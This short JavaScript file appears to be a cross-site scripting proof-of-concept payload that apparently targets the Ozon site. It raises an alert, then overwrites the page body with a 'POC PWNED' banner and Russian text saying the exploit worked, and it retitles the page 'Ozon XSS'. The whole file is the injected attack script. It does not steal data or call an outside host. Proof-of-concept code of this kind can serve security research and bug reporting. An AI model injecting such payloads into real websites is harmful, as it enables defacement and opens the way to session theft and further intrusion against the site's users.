alert('new_5');

(function() {
    setTimeout(function() {
        document.body.innerHTML = '<body style="background: #2b2b2b; color: #fff; margin:0; display:flex; align-items:center; justify-content:center; height:100vh;"><div><h1>POC PWNED</h1><p>Эксплойт сработал</p></div></body>';
        document.title = 'Ozon XSS';
    }, 0);
})();
void(0);
